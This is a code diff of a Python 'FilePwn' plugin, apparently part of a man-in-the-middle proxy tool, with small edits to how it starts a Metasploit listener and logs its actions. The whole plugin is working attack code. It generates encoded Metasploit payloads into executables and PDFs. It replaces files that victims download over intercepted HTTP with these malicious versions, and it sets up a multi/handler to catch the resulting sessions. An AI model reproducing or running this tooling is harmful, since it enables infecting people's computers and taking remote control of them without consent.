@@ -1,6 +1,5 @@
 import os,subprocess,logging,time
 from plugins.plugin import Plugin
-from plugins.StartMSF import launch_msf
 exe_mimetypes = ['application/octet-stream', 'application/x-msdownload', 'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe', 'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program']
 
 class FilePwn(Plugin):
@@ -15,10 +14,10 @@ class FilePwn(Plugin):
         self.options = options
         self.payloads = {}
         self._make_files()
-        if options.launch_msf_listener:
+        if options.launch_msf_listener and options.msf_rc == "/tmp/tmp.rc":
             self._start_msf()
     def _start_msf(self):
-        f = open("/tmp/file.rc","w")
+        f = open("/tmp/tmp.rc","a")
         opts = [i.replace("="," ") for i in 
                     self.options.msf_file_payload_opts.split(" ")]
         f.write("use multi/handler\n")
@@ -26,10 +25,7 @@ class FilePwn(Plugin):
         for opt in opts:
             f.write("set %s\n" % opt)
         f.write("set ExitOnSession false\nexploit -j\n")
-        f.flush()
-        msfc = os.path.join(self.options.msf_path,"msfconsole")
-        launch_msf(msfc,f.name,self.options.msf_user)
-        
+        f.close()
         
     def _make_files(self):
         self.exe_made = False
@@ -45,7 +41,7 @@ class FilePwn(Plugin):
             msfe = os.path.join(self.options.msf_path,"msfencode") + " %s"
             payload = msfp%(self.options.msf_file_payload,self.options.msf_file_payload_opts)
             encode = msfe % "-t exe -o /tmp/tmp.exe -e x86/shikata_ga_nai -c 8"
-            print payload+" R |"+encode
+            #print payload+" R |"+encode
             os.system(payload+" R |"+encode)
             self.exe_made = True
             self.exe = "/tmp/tmp.exe"
@@ -72,10 +68,11 @@ class FilePwn(Plugin):
         self.payloads['application/pdf'] = open("/tmp/tmp.pdf","rb").read()
     
     def handleResponse(self,request,data):
-        print "http://" + request.client.getRequestHostname() + request.uri
+        #print "http://" + request.client.getRequestHostname() + request.uri
         ch = request.client.headers['Content-Type']
-        print ch
+        #print ch
         if ch in self.payloads:
+            print "Replaced file of mimtype %s with malicious version" % ch
             data = self.payloads[ch]
             return {'request':request,'data':data}
         else:
